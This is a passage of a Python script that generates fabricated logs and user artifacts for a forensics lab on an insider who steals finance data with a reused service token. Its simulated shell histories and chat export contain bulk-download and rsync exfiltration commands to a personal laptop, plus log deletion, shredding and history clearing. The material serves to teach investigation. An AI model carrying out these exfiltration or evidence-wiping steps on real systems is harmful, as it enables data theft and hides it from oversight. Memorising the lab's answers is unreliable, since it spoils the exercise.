        "# vpn01 session log",
        "# fields: timestamp user source_public_ip assigned_ip event bytes_in bytes_out",
        "",
    ]

    for day_offset in range(0, 150):
        day = date(2026, 3, 20) + timedelta(days=day_offset)

        if day > INCIDENT_DAY:
            break

        if day_offset % 4:
            continue

        assigned = f"10.10.90.{20 + (day_offset % 40)}"

        lines.append(
            f"{day.isoformat()} 21:1{day_offset % 6}:04 {USER_SUBJECT} "
            f"198.51.100.{14 + (day_offset % 60)} {assigned} CONNECT 0 0"
        )
        lines.append(
            f"{day.isoformat()} 23:4{day_offset % 6}:51 {USER_SUBJECT} "
            f"198.51.100.{14 + (day_offset % 60)} {assigned} DISCONNECT "
            f"{RNG.randrange(2_000_000, 40_000_000)} "
            f"{RNG.randrange(400_000, 9_000_000)}"
        )

    lines += [
        f"{INCIDENT_DAY.isoformat()} 21:08:12 {USER_SUBJECT} 198.51.100.77 "
        "10.10.90.44 CONNECT 0 0",
        f"{INCIDENT_DAY.isoformat()} 22:51:30 {USER_SUBJECT} 198.51.100.77 "
        "10.10.90.44 DISCONNECT 1180422 904113887",
        f"{INCIDENT_DAY.isoformat()} 22:51:31 ALERT egress volume for user "
        f"{USER_SUBJECT} exceeded 30-day baseline by 4180%",
    ]

    return "\n".join(lines) + "\n"


def build_network_log():
    """
    Network connection log.

    Carries the Lab 2 lines forward verbatim, then adds the finance
    application traffic and the rsync bursts to TOBOR-RM, with byte
    counts so the volume can be totalled independently of the
    tobor_sync log.
    """

    lines = [
        "TIME                 SOURCE          DESTINATION     PORT   PROTO  BYTES_OUT   STATE",
    ]

    for day_offset in range(0, 170):
        day = date(2026, 3, 1) + timedelta(days=day_offset)

        if day > INCIDENT_DAY:
            break

        lines.append(
            f"{day.isoformat()} 02:00:0{day_offset % 6}   {HOST_BACKUP01}     "
            f"{HOST_DB01}      5432   TCP    412118      ESTABLISHED"
        )
        lines.append(
            f"{day.isoformat()} 08:0{day_offset % 6}:14   {HOST_WORKSTATION}     "
            f"{HOST_APP01}      22     TCP    88214       ESTABLISHED"
        )

        if day >= date(2026, 6, 1):
            lines.append(
                f"{day.isoformat()} 19:2{day_offset % 6}:41   {HOST_WORKSTATION}     "
                f"{HOST_FIN_APP}      8443   TCP    "
                f"{RNG.randrange(900_000, 48_000_000):<11d} ESTABLISHED"
            )

        # Nightly sync to the laptop, growing over time.
        if day >= date(2026, 6, 12) and day_offset % 2 == 0:
            lines.append(
                f"{day.isoformat()} 22:4{day_offset % 6}:09   {HOST_WORKSTATION}     "
                f"{TOBOR_LEASE_OLD}     873    TCP    "
                f"{RNG.randrange(4_000_000, 220_000_000):<11d} ESTABLISHED"
            )

    # ---- Lab 2 incident-day lines, preserved ----
    lines += [
        f"2026-08-20 10:22:14   {HOST_WORKSTATION}     {HOST_APP01}      22     TCP    88214       ESTABLISHED",
        f"2026-08-20 11:03:21   {HOST_WORKSTATION}     8.8.8.8         53     UDP    512         ESTABLISHED",
        f"2026-08-20 14:20:03   {HOST_BACKUP01}     {HOST_WORKSTATION}     22     TCP    74110       ESTABLISHED",
        f"2026-08-20 14:21:17   {HOST_WORKSTATION}     {HOST_BACKUP01}     443    TCP    91204       ESTABLISHED",
        f"2026-08-20 14:22:11   {HOST_WORKSTATION}     {HOST_BACKUP01}     22     TCP    65330       ESTABLISHED",
    ]

    # ---- Lab 3 incident-day lines ----
    lines += [
        f"2026-08-20 08:02:41   {TOBOR_LEASE_OLD}     {HOST_WORKSTATION}     22     TCP    4820        REFUSED",
        f"2026-08-20 08:02:45   {TOBOR_LEASE_OLD}     {HOST_WORKSTATION}     22     TCP    4820        REFUSED",
        f"2026-08-20 09:41:08   {HOST_WORKSTATION}     {HOST_FIN_APP}      8443   TCP    1904221     ESTABLISHED",
        f"2026-08-20 11:52:36   {HOST_WORKSTATION}     {HOST_FIN_APP}      8443   TCP    38221904    ESTABLISHED",
        f"2026-08-20 12:40:11   {HOST_WORKSTATION}     {HOST_FILESHARE}     445    TCP    221904118   ESTABLISHED",
        f"2026-08-20 15:03:58   {HOST_WORKSTATION}     {TOBOR_LEASE_NEW}     873    TCP    402118446   ESTABLISHED",
        f"2026-08-20 15:19:02   {HOST_WORKSTATION}     {TOBOR_LEASE_NEW}     873    TCP    388104992   ESTABLISHED",
        f"2026-08-20 15:33:47   {HOST_WORKSTATION}     {TOBOR_LEASE_NEW}     22     TCP    114008221   ESTABLISHED",
        f"2026-08-20 15:47:19   {HOST_WORKSTATION}     {TOBOR_LEASE_NEW}     873    TCP    96220418    CLOSED",
    ]

    return "\n".join(lines) + "\n"


def build_finance_api_access_log(first_day=None, last_day=None, include_sweep=True):
    """
    The finance reporting application's access log.

    Three access patterns sit side by side, and telling them apart is
    the exercise:

      priya      -- a human analyst: browser agent, business hours,
                    UI endpoints, small responses, a handful of
                    exports a week
      svc_report -- a scheduled service: identical request every night
                    at 03:00, same size every time
      alex       -- reconnaissance in June (lots of 403s hitting
                    endpoints he has no entitlement for), then bulk
                    extraction from July, scripted, with a
                    python-requests agent and eight-figure response
                    sizes

    The log is intentionally long. Students are expected to use grep,
    cut, sort and uniq -c rather than read it.

    The date-range parameters let the same code produce both the live
    log and its rotated predecessor:

      access.log    2026-08-01 .. 2026-08-20, including the final sweep
      access.log.1  2026-03-01 .. 2026-07-31, rotated out on 08-01

    This split matters. The June reconnaissance -- the 403s that show
    Alex probing endpoints he had no entitlement for -- falls entirely
    inside the rotated file, and the rotated file is one of the files
    Alex deleted. Students cannot establish the enumeration phase
    without recovering it.
    """

    first_day = first_day or date(2026, 3, 1)
    last_day = last_day or INCIDENT_DAY

    lines = [
        "# fin-app01 REST API access log",
        "# host user [timestamp] \"request\" status bytes session agent",
        "",
    ]

    ui_endpoints = [
        "/api/v2/reports/list",
        "/api/v2/dashboard/summary",
        "/api/v2/accounts/search",
        "/healthz",
    ]

    sensitive_endpoints = [
        "/api/v2/reports/bank-reconciliation",
        "/api/v2/reports/wire-transfers",
        "/api/v2/reports/client-accounts",
        "/api/v2/reports/payroll-disbursements",
        "/api/v2/accounts/bulk-export",
    ]

    browser_agent = "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/128.0"
    script_agent = "python-requests/2.31.0"
    curl_agent = "curl/8.5.0"

    def emit(day, time_text, user, host, request, status, size, session, agent):
        lines.append(
            f"{host} - {user} [{day.isoformat()}T{time_text}Z] "
            f'"{request}" {status} {size} session={session} agent="{agent}"'
        )

    for day_offset in range(0, 200):
        day = first_day + timedelta(days=day_offset)

        if day > last_day:
            break

        weekday = day.weekday()

        # ---- svc_report: the nightly scheduled pull ----
        emit(
            day,
            "03:00:04",
            USER_SERVICE,
            HOST_FIN_APP,
            "POST /api/v2/auth/token HTTP/1.1",
            200,
            412,
            "svc-nightly",
            curl_agent,
        )
        emit(
            day,
            "03:00:06",
            USER_SERVICE,
            HOST_FIN_APP,
            "GET /api/v2/reports/daily-summary?format=csv HTTP/1.1",
            200,
            184322,
            "svc-nightly",
            curl_agent,
        )

        if weekday < 5:
            # ---- priya: ordinary analyst behaviour ----
            emit(
                day,
                f"08:4{day_offset % 6}:12",
                USER_ANALYST,
                HOST_WORKSTATION,
                "POST /api/v2/auth/token HTTP/1.1",
                200,
                418,
                f"ui-{4000 + day_offset}",
                browser_agent,
            )

            for index, endpoint in enumerate(ui_endpoints):
                emit(
                    day,
                    f"09:1{index}:3{day_offset % 9}",
                    USER_ANALYST,
                    HOST_WORKSTATION,
                    f"GET {endpoint} HTTP/1.1",
                    200,
                    RNG.randrange(1800, 24000),
                    f"ui-{4000 + day_offset}",
                    browser_agent,
                )

            if day_offset % 5 == 0:
                emit(
                    day,
                    f"11:2{day_offset % 6}:48",
                    USER_ANALYST,
                    HOST_WORKSTATION,
                    "GET /api/v2/reports/bank-reconciliation?month="
                    f"{day.strftime('%Y-%m')}&format=xlsx HTTP/1.1",
                    200,
                    RNG.randrange(180_000, 420_000),
                    f"ui-{4000 + day_offset}",
                    browser_agent,
                )

        # ---- alex: phase 1, reconnaissance (June) ----
        if date(2026, 6, 1) <= day < date(2026, 7, 1):
            emit(
                day,
                f"19:0{day_offset % 6}:11",
                USER_SUBJECT,
                HOST_WORKSTATION,
                "POST /api/v2/auth/token HTTP/1.1",
                200,
                418,
                f"ui-{7000 + day_offset}",
                browser_agent,
            )

            for index, endpoint in enumerate(sensitive_endpoints):
                emit(
                    day,
                    f"19:0{(day_offset + index) % 6}:3{index}",
                    USER_SUBJECT,
                    HOST_WORKSTATION,
                    f"GET {endpoint} HTTP/1.1",
                    403,
                    96,
                    f"ui-{7000 + day_offset}",
                    browser_agent,
                )

            if day == date(2026, 6, 28):
                emit(
                    day,
                    "19:41:02",
                    USER_SUBJECT,
                    HOST_WORKSTATION,
                    "POST /api/v2/auth/token HTTP/1.1",
                    200,
                    418,
                    "svc-nightly",
                    script_agent,
                )
                emit(
                    day,
                    "19:41:05",
                    USER_SUBJECT,
                    HOST_WORKSTATION,
                    "GET /api/v2/reports/bank-reconciliation?quarter=Q1"
                    "&format=xlsx HTTP/1.1",
                    200,
                    284_119,
                    "svc-nightly",
                    script_agent,
                )

        # ---- alex: phase 2, bulk extraction (July onward) ----
        if day >= date(2026, 7, 1):
            session = "svc-nightly"

            emit(
                day,
                f"22:1{day_offset % 6}:02",
                USER_SUBJECT,
                HOST_WORKSTATION,
                "POST /api/v2/auth/token HTTP/1.1",
                200,
                418,
                session,
                script_agent,
            )

            for index, endpoint in enumerate(sensitive_endpoints):
                for page in range(1, 7):
                    emit(
                        day,
                        f"22:{20 + index:02d}:{(page * 7) % 60:02d}",
                        USER_SUBJECT,
                        HOST_WORKSTATION,
                        f"GET {endpoint}?page={page}&page_size=5000"
                        "&format=xlsx HTTP/1.1",
                        200,
                        RNG.randrange(900_000, 9_400_000),
                        session,
                        script_agent,
                    )

    if not include_sweep:
        return "\n".join(lines) + "\n"

    # ---- Incident day: the final sweep ----
    sweep_day = INCIDENT_DAY

    emit(
        sweep_day,
        "09:41:02",
        USER_SUBJECT,
        HOST_WORKSTATION,
        "POST /api/v2/auth/token HTTP/1.1",
        200,
        418,
        "svc-nightly",
        script_agent,
    )

    final_sweep = [
        ("/api/v2/reports/bank-reconciliation?quarter=Q1&format=xlsx", "11:52:36"),
        ("/api/v2/reports/bank-reconciliation?quarter=Q2&format=xlsx", "11:58:14"),
        ("/api/v2/reports/wire-transfers?year=2026&format=xlsx", "12:06:49"),
        ("/api/v2/reports/client-accounts?scope=all&format=csv", "12:19:03"),
        ("/api/v2/reports/payroll-disbursements?year=2026&format=xlsx", "12:31:55"),
        ("/api/v2/accounts/bulk-export?scope=all&format=csv", "12:40:08"),
    ]

    for request_path, time_text in final_sweep:
        emit(
            sweep_day,
            time_text,
            USER_SUBJECT,
            HOST_WORKSTATION,
            f"GET {request_path} HTTP/1.1",
            200,
            RNG.randrange(3_800_000, 46_000_000),
            "svc-nightly",
            script_agent,
        )

    emit(
        sweep_day,
        "12:44:17",
        USER_SUBJECT,
        HOST_WORKSTATION,
        "DELETE /api/v2/audit/session/svc-nightly HTTP/1.1",
        403,
        96,
        "svc-nightly",
        script_agent,
    )

    return "\n".join(lines) + "\n"


def build_finance_api_error_log():
    """Errors from the finance app, including the entitlement denials."""

    lines = [
        "# fin-app01 application error log",
        "",
    ]

    for day_offset in range(0, 28):
        day = date(2026, 6, 1) + timedelta(days=day_offset)

        lines.append(
            f"{day.isoformat()} 19:0{day_offset % 6}:31 WARN "
            f"entitlement_denied user={USER_SUBJECT} "
            "role=operations_analyst required_role=finance_reporting "
            "resource=/api/v2/reports/wire-transfers"
        )

    lines += [
        "2026-06-28 19:40:58 WARN token_scope_mismatch "
        f"user={USER_SUBJECT} presented_scope=report:read:all "
        "issued_to=svc_report",
        "2026-06-28 19:41:01 ERROR service_token_reuse_detected "
        f"token_owner={USER_SERVICE} presented_by={USER_SUBJECT} "
        f"source={HOST_WORKSTATION} action=ALLOWED_LEGACY_COMPAT",
        "2026-07-01 22:11:09 WARN rate_limit_soft_exceeded "
        f"user={USER_SUBJECT} window=60s requests=214",
        "2026-08-20 12:44:17 ERROR audit_tamper_attempt "
        f"user={USER_SUBJECT} action=DELETE resource=/api/v2/audit/session "
        "result=DENIED",
    ]

    return "\n".join(lines) + "\n"


def build_dlp_alerts_log():
    """
    DLP alerts. Several fired. None were actioned.

    This is both a finding and a recommendation hook for the student's
    report -- the control worked, the process around it did not.
    """

    lines = [
        "# Endpoint DLP alert log -- workstation (10.10.20.10)",
        "# severity | rule | disposition",
        "",
    ]

    rules = [
        ("DLP-0012", "Bank account number pattern in outbound transfer"),
        ("DLP-0019", "Bulk spreadsheet export exceeds 50MB"),
        ("DLP-0023", "Transfer to host not in asset inventory"),
        ("DLP-0031", "Archive created from finance-classified source"),
    ]

    for day_offset in range(0, 60):
        day = date(2026, 6, 25) + timedelta(days=day_offset)

        if day > INCIDENT_DAY:
            break

        if day_offset % 5:
            continue

        rule_id, rule_text = rules[day_offset % len(rules)]

        lines.append(
            f"{day.isoformat()} 22:5{day_offset % 6}:11 MEDIUM {rule_id} "
            f"user={USER_SUBJECT} rule=\"{rule_text}\" "
            f"destination={TOBOR_LEASE_OLD} disposition=ALERT_ONLY "
            "reviewed=NO"
        )

    lines += [
        f"{INCIDENT_DAY.isoformat()} 14:44:19 HIGH DLP-0031 "
        f"user={USER_SUBJECT} rule=\"Archive created from finance-classified "
        'source" path=/home/alex/Downloads/.cache_sync/'
        "finance_packet_2026-08-20.tar.gz disposition=ALERT_ONLY reviewed=NO",
        f"{INCIDENT_DAY.isoformat()} 15:04:02 CRITICAL DLP-0023 "
        f"user={USER_SUBJECT} rule=\"Transfer to host not in asset inventory\" "
        f"destination={TOBOR_LEASE_NEW} ({TOBOR_FQDN}) bytes=402118446 "
        "disposition=ALERT_ONLY reviewed=NO",
        f"{INCIDENT_DAY.isoformat()} 15:47:21 CRITICAL DLP-0012 "
        f"user={USER_SUBJECT} rule=\"Bank account number pattern in outbound "
        'transfer" matches=41122 disposition=ALERT_ONLY reviewed=NO',
        f"{ACQUISITION_DAY.isoformat()} 06:40:00 INFO case {CASE_NUMBER} opened "
        "-- retroactive review of 14 unreviewed alerts",
    ]

    return "\n".join(lines) + "\n"


def build_usb_events_log():
    """
    USB insertion history.

    Deliberate red herring: a removable drive really was attached on
    the incident day, but the volume of data that moved over it does
    not come close to the network transfers. Students who stop at the
    USB log reach the wrong conclusion about the exfiltration channel.
    """

    lines = [
        "# udev removable media events -- workstation",
        "",
    ]

    for day_offset in range(0, 150):
        day = date(2026, 3, 15) + timedelta(days=day_offset)

        if day > INCIDENT_DAY:
            break

        if day_offset % 11:
            continue

        lines.append(
            f"{day.isoformat()} 08:3{day_offset % 6}:12 ADD "
            "vendor=Logitech product=USB_Receiver "
            f"serial=LG00{day_offset % 10} type=HID"
        )

    lines += [
        f"{INCIDENT_DAY.isoformat()} 13:41:08 ADD vendor=SanDisk "
        "product=Cruzer_Blade serial=4C530001120716108404 type=MASS_STORAGE "
        "mount=/media/alex/CRUZER size=15.5GB",
        f"{INCIDENT_DAY.isoformat()} 13:52:44 FILE_COPY "
        "source=/home/alex/Documents/project.txt "
        "destination=/media/alex/CRUZER/project.txt bytes=412",
        f"{INCIDENT_DAY.isoformat()} 13:53:02 FILE_COPY "
        "source=/home/alex/Documents/notes.txt "
        "destination=/media/alex/CRUZER/notes.txt bytes=388",
        f"{INCIDENT_DAY.isoformat()} 14:02:19 REMOVE vendor=SanDisk "
        "product=Cruzer_Blade serial=4C530001120716108404 "
        "total_bytes_written=800",
    ]

    return "\n".join(lines) + "\n"


def build_file_audit_log():
    """auditd-style file access records against the finance share."""

    lines = [
        "# auditd file access records -- /mnt/finance_share",
        "",
    ]

    for day_offset in range(0, 80):
        day = date(2026, 6, 1) + timedelta(days=day_offset)

        if day > INCIDENT_DAY:
            break

        lines.append(
            f"{day.isoformat()} 09:1{day_offset % 6}:22 type=PATH "
            f"uid=1002 user={USER_ANALYST} "
            f"name=/mnt/finance_share/reports/2026/Q{1 + (day_offset % 2)}/"
            f"monthly_summary_{day.strftime('%Y-%m')}.xlsx op=OPEN_READ"
        )

        if day_offset % 2 == 0:
            lines.append(
                f"{day.isoformat()} 19:3{day_offset % 6}:51 type=PATH "
                f"uid=1000 user={USER_SUBJECT} "
                "name=/mnt/finance_share/bank_statements/"
                f"statement_{day.strftime('%Y-%m')}.csv op=OPEN_READ"
            )

    lines += [
        f"{INCIDENT_DAY.isoformat()} 12:40:12 type=PATH uid=1000 "
        f"user={USER_SUBJECT} name=/mnt/finance_share/bank_statements/ "
        "op=READDIR entries=96",
        f"{INCIDENT_DAY.isoformat()} 12:41:33 type=PATH uid=1000 "
        f"user={USER_SUBJECT} name=/mnt/finance_share/reports/2026/ "
        "op=BULK_READ files=142 bytes=221904118",
        f"{INCIDENT_DAY.isoformat()} 14:43:10 type=PATH uid=1000 "
        f"user={USER_SUBJECT} name=/home/alex/Downloads/.cache_sync/ "
        "op=CREATE mode=0700",
    ]

    return "\n".join(lines) + "\n"


def build_cron_log():
    """Routine cron activity, carried forward from Lab 2."""

    lines = []

    for day_offset in range(0, 175):
        day = date(2026, 3, 1) + timedelta(days=day_offset)

        if day > INCIDENT_DAY:
            break

        prefix = day.strftime("%b %d")

        lines.append(
            f"{prefix} 02:00:00 workstation CRON[{3000 + day_offset}]: "
            f"({USER_BACKUP}) CMD (/usr/local/bin/backup_rotate.sh)"
        )
        lines.append(
            f"{prefix} 03:00:00 workstation CRON[{3200 + day_offset}]: "
            "(root) CMD (/usr/local/bin/sync_to_offsite.sh)"
        )

        # Alex's own scheduled job, added in June and removed on the
        # incident day. The crontab itself is gone; this log is what
        # proves it existed.
        if date(2026, 6, 12) <= day <= INCIDENT_DAY:
            lines.append(
                f"{prefix} 22:30:00 workstation CRON[{3400 + day_offset}]: "
                f"({USER_SUBJECT}) CMD (/home/alex/.local/bin/tobor_sync.sh)"
            )

    lines.append(
        "Aug 20 15:50:12 workstation crontab[2240]: "
        f"({USER_SUBJECT}) DELETE (crontab deleted by {USER_SUBJECT})"
    )

    return "\n".join(lines) + "\n"


def build_dpkg_log():
    """Routine package activity, plus the tooling Alex installed."""

    packages = [
        "openssh-server", "curl", "wget", "rsync", "cron", "vim", "git",
        "python3", "ca-certificates", "sudo", "cifs-utils",
    ]

    lines = []

    for index, package in enumerate(packages):
        day = date(2026, 3, 1) + timedelta(days=(index * 9) % 120)

        lines.append(
            f"{day.isoformat()} 06:0{index % 6}:00 upgrade {package} "
            f"1.0.{index} 1.0.{index + 1}"
        )

    lines += [
        "2026-06-10 20:14:52 install python3-requests <none> 2.31.0-1",
        "2026-06-10 20:15:08 install p7zip-full <none> 16.02+dfsg-8",
        "2026-06-11 21:02:31 install rsync 3.2.7-1 3.2.7-1",
    ]

    return "\n".join(lines) + "\n"


def build_maintenance_log():
    """Maintenance log, carried forward from Lab 2 and extended."""

    return f"""2026-08-19 02:00:04 Scheduled backup job started
2026-08-19 02:00:09 Authentication failure for {USER_BACKUP} -- job aborted
2026-08-20 14:20:10 Manual backup job started outside maintenance window
2026-08-20 14:21:17 Authenticated as {USER_BACKUP} from {HOST_BACKUP01}
2026-08-20 14:31:44 Manual backup job completed
2026-08-20 14:43:02 Unscheduled archive operation detected in user space
2026-08-20 15:50:15 Maintenance session closed
"""


def build_application_log():
    """Internal portal application log, carried forward from Lab 2."""

    lines = []

    for day_offset in range(0, 170):
        day = date(2026, 3, 1) + timedelta(days=day_offset)

        if day > INCIDENT_DAY:
            break

        lines.append(
            f"{day.isoformat()} 08:1{day_offset % 6}:12 INFO "
            f"User {USER_SUBJECT} authenticated"
        )
        lines.append(
            f"{day.isoformat()} 17:3{day_offset % 6}:40 INFO "
            f"Session ended for {USER_SUBJECT}"
        )

    lines += [
        "2026-08-20 14:45:11 INFO Application restart requested by alex",
        "2026-08-20 14:45:13 INFO Application restart completed",
        "2026-08-20 15:50:22 WARN Configuration backup created outside change window",
    ]

    return "\n".join(lines) + "\n"


def build_remote_access_log():
    """Remote-access log. Lab 2 lines preserved, Lab 3 lines appended."""

    return f"""2026-08-20 10:21:40 SUCCESS alex {HOST_APP01} SSH
2026-08-20 14:20:08 SUCCESS backupadmin {HOST_BACKUP01} SSH
2026-08-20 14:31:44 CLOSED backupadmin {HOST_BACKUP01} SSH
2026-08-20 14:58:12 SUCCESS alex {TOBOR_LEASE_NEW} SSH key=ED25519 {TOBOR_HOSTKEY}
2026-08-20 15:03:58 SUCCESS alex {TOBOR_LEASE_NEW} RSYNC bytes=402118446
2026-08-20 15:19:02 SUCCESS alex {TOBOR_LEASE_NEW} RSYNC bytes=388104992
2026-08-20 15:33:47 SUCCESS alex {TOBOR_LEASE_NEW} SCP bytes=114008221
2026-08-20 15:47:19 CLOSED alex {TOBOR_LEASE_NEW} RSYNC bytes=96220418
"""


def build_tobor_sync_log():
    """
    The sync script's own log.

    Per-run byte counts that total to a figure students can compare
    against the network log -- two independent sources for the same
    number, which is exactly the corroboration the report asks for.
    """

    lines = [
        "# tobor_sync.sh run log",
        "# started  | files | bytes | destination | result",
        "",
    ]

    total_bytes = 0
    total_files = 0

    for day_offset in range(0, 70):
        day = date(2026, 6, 12) + timedelta(days=day_offset)

        if day > INCIDENT_DAY:
            break

        if day_offset % 2:
            continue

        files = RNG.randrange(8, 140)
        payload = RNG.randrange(4_000_000, 220_000_000)

        total_files += files
        total_bytes += payload

        lines.append(
            f"{day.isoformat()} 22:30:01 | {files:4d} | {payload:11d} | "
            f"{USER_SUBJECT}@{TOBOR_LEASE_OLD}:/data/incoming/ | OK"
        )

    incident_runs = [
        ("15:03:58", 142, 402_118_446, TOBOR_LEASE_NEW),
        ("15:19:02", 118, 388_104_992, TOBOR_LEASE_NEW),
        ("15:33:47", 64, 114_008_221, TOBOR_LEASE_NEW),
        ("15:47:19", 22, 96_220_418, TOBOR_LEASE_NEW),
    ]

    for time_text, files, payload, destination in incident_runs:
        total_files += files
        total_bytes += payload

        lines.append(
            f"{INCIDENT_DAY.isoformat()} {time_text} | {files:4d} | "
            f"{payload:11d} | {USER_SUBJECT}@{destination}:/data/incoming/ | OK"
        )

    lines.append("")
    lines.append(
        f"# lifetime totals: {total_files} files, {total_bytes} bytes "
        f"({total_bytes / (1024 ** 3):.2f} GiB)"
    )

    WORKBOOK_STATS["__sync_totals__"] = {
        "files": total_files,
        "bytes": total_bytes,
    }

    return "\n".join(lines) + "\n"


def build_daily_backup_logs():
    """
    Daily backup job logs carried forward from the Lab 2 backup drive.

    Kept verbatim (including the 2026-08-19 failure and the 2026-08-20
    out-of-window run) so Lab 2's findings still hold here, and so the
    file listing is genuinely large.
    """

    logs = {}
    current = BACKUP_LOG_START
    job_id = 40000

    while current <= BACKUP_LOG_END:
        job_id += 1
        relative_path = f"archives/backup_log_{current.isoformat()}.txt"

        files_backed_up = 120 + (current.toordinal() % 40)
        size_mb = 512 + (current.toordinal() % 200)
        status = "SUCCESS"
        note = ""

        if current == date(2026, 8, 20):
            note = (
                "\nNOTE: Job started outside the normal maintenance window "
                f"(14:00 instead of 02:00). Authenticated as {USER_BACKUP} "
                f"from {HOST_WORKSTATION}.\n"
            )
        elif current == date(2026, 8, 19):
            status = "FAILED"
            note = (
                f"\nNOTE: Job failed - authentication error for {USER_BACKUP}. "
                "Retried manually the next day.\n"
            )

        logs[relative_path] = (
            "Backup Job Log\n"
            f"Date: {current.isoformat()}\n"
            f"Job ID: {job_id}\n"
            "Host: backup01\n"
            f"Account: {USER_BACKUP}\n"
            f"Files backed up: {files_backed_up}\n"
            f"Total size: {size_mb} MB\n"
            f"Status: {status}\n"
            f"{note}"
        )

        current += timedelta(days=1)

    return logs


# ============================================================
# USER ARTIFACT BUILDERS
# ============================================================

def build_alex_bash_history_rotated():
    """
    The rotated shell history.

    Alex cleared the live history, but logrotate had already preserved
    the previous file. This is where the rsync and tar commands
    actually survive -- students who only read .bash_history miss the
    strongest single artifact in the image.
    """

    lines = [
        "cd /mnt/finance_share",
        "ls -la reports/2026/Q1",
        "du -sh reports/",
        "python3 -c 'import requests; print(requests.__version__)'",
        "cat ~/.local/bin/tobor_sync.sh",
        "chmod 700 ~/.local/bin/tobor_sync.sh",
        "crontab -l",
        "crontab -e",
        "mkdir -p ~/Downloads/.cache_sync",
        "chmod 700 ~/Downloads/.cache_sync",
    ]

    for index in range(1, 7):
        lines.append(
            "curl -s -H \"Authorization: Bearer $REPORT_TOKEN\" "
            f"https://{HOST_FIN_APP}:8443/api/v2/reports/"
            f"bank-reconciliation?page={index}'&'page_size=5000'&'format=xlsx "
            f"-o ~/Downloads/.cache_sync/recon_page{index}.xlsx"
        )

    lines += [
        "ls -la ~/Downloads/.cache_sync",
        "du -sh ~/Downloads/.cache_sync",
        f"ssh-keygen -F {TOBOR_LEASE_OLD}",
        f"ssh {USER_SUBJECT}@{TOBOR_LEASE_OLD}",
        f"rsync -az ~/Downloads/.cache_sync/ {USER_SUBJECT}@{TOBOR_LEASE_OLD}:/data/incoming/",
        f"rsync -az --remove-source-files ~/Downloads/.cache_sync/ "
        f"{USER_SUBJECT}@{TOBOR_LEASE_OLD}:/data/incoming/",
        "history -w",
    ]

    return "\n".join(lines) + "\n"


def build_alex_bash_history():
    """
    The live shell history.

    Opens with ordinary Lab 2 content so it looks familiar, then runs
    into the incident day. It ends mid-cleanup with no `exit`, which is
    itself worth noticing.
    """

    lines = [
        "pwd", "ls -la", "cd Documents", "cat notes.txt", "cat project.txt",
        "cd ..", "ls -la", "less passwords_backup.txt", "cd Downloads",
        "ls -la", "cd ~", "df -h", "free -m", "uptime", "whoami", "id",
        "cat /etc/hostname", "cat investigation.txt",
    ]

    # Lab 2 lines, preserved.
    lines += [
        f"ssh alex@{HOST_APP01}",
        f"ssh {USER_BACKUP}@{HOST_BACKUP01}",
        f"curl http://{HOST_APP01}/status",
        f"wget http://{HOST_BACKUP01}/backup.zip",
        "ls -la",
        "history",
    ]

    # Lab 3 incident-day activity.
    lines += [
        "cd /mnt/finance_share/bank_statements",
        "ls | wc -l",
        "grep -ril 'routing' . | head",
        "cd ~/Downloads/.cache_sync",
        "ls -la",
        "du -sh .",
        "file *.xlsx",
        "tar -czf finance_packet_2026-08-20.tar.gz *.xlsx *.csv",
        "ls -la finance_packet_2026-08-20.tar.gz",
        "sha256sum finance_packet_2026-08-20.tar.gz",
        f"cat ~/.ssh/config | grep -A3 tobor",
        f"ssh {USER_SUBJECT}@{TOBOR_FQDN} 'df -h /data'",
        f"rsync -az --remove-source-files ~/Downloads/.cache_sync/ "
        f"{USER_SUBJECT}@{TOBOR_FQDN}:/data/incoming/",
        f"ssh {USER_SUBJECT}@{TOBOR_FQDN} 'ls -la /data/incoming | wc -l'",
        "cd ~",
        "rm -rf ~/Downloads/.cache_sync",
        "crontab -r",
        "shred -u ~/.local/share/WhatsApp/chat_export_Kestrel.txt",
        "rm -f /var/log/finance_api/access.log.1",
        "history -c",
    ]

    return "\n".join(lines) + "\n"


def build_whatsapp_kestrel_export():
    """
    The deleted WhatsApp thread.

    The contact is unidentified ("Kestrel"), which keeps the handout
    honest: students can prove a conversation happened and what it
    said, but they cannot prove who was on the other end from this
    evidence alone. That distinction is worth real rubric points.
    """

    return f"""WhatsApp Chat Export
Conversation: Kestrel (+1 555 0147 XXXX)
Exported: 2026-08-20 15:44:02
Messages: 38

[2026-06-08 21:14] Kestrel: saw your message. you still have access to the
 reporting side?
[2026-06-08 21:16] Alex: read only. the good reports are gated behind a role
 i don't have
[2026-06-08 21:17] Kestrel: what would it take
[2026-06-08 21:22] Alex: there's a service account token in the scheduler
 config. nobody rotates it
[2026-06-08 21:23] Kestrel: then that's the answer isn't it

[2026-06-28 19:48] Alex: it worked. pulled Q1 recon end to end
[2026-06-28 19:49] Kestrel: how big
[2026-06-28 19:51] Alex: 280k for one quarter. there are four years in there
[2026-06-28 19:52] Kestrel: don't move it over the corp network to anything
 they can see. use your own box
[2026-06-28 19:53] Alex: already on the vlan. it pulls a lease like anything
 else, nobody looks at dhcp

[2026-07-02 22:40] Alex: set it on a cron. 2230 nightly, pushes to tobor
[2026-07-02 22:41] Kestrel: tobor?
[2026-07-02 22:41] Alex: my laptop. robot backwards. don't ask
[2026-07-02 22:43] Kestrel: just keep it off the asset list

[2026-08-14 23:02] Kestrel: client account master is the one that matters.
 names, routing, balances in one table
[2026-08-14 23:04] Alex: i can get it. bulk-export endpoint doesn't paginate
 properly, it just hands you everything
[2026-08-14 23:05] Kestrel: friday then

[2026-08-20 12:46] Alex: full sweep done. recon Q1 Q2, wire ledger, client
 master, payroll
[2026-08-20 12:47] Kestrel: packaged?
[2026-08-20 12:48] Alex: tarring it now
[2026-08-20 15:41] Alex: it's on tobor. /data/incoming
[2026-08-20 15:42] Kestrel: good. wipe the staging dir and the api log, then
 this thread
[2026-08-20 15:43] Alex: doing it now
[2026-08-20 15:43] Kestrel: and don't log in again tonight
"""


def build_whatsapp_noise_exports():
    """Innocuous threads, so the incriminating one has to be found."""

    return {
        "chat_export_Family.txt": """WhatsApp Chat Export
Conversation: Family
Exported: 2026-08-18 20:11:40
Messages: 412

[2026-08-16 18:02] Mom: are you coming sunday
[2026-08-16 18:40] Alex: yes. bringing the salad thing again
[2026-08-16 18:41] Mom: the one with the walnuts
[2026-08-16 18:44] Alex: the one with the walnuts
[2026-08-17 09:12] Dad: car make that noise again?
[2026-08-17 09:30] Alex: no it stopped. probably fine
[2026-08-17 09:31] Dad: that's not how cars work
""",
        "chat_export_Soccer_League.txt": """WhatsApp Chat Export
Conversation: Thursday Soccer
Exported: 2026-08-19 07:55:12
Messages: 1204

[2026-08-18 19:40] Devin: field 3 is flooded, we're on 7
[2026-08-18 19:41] Alex: again?
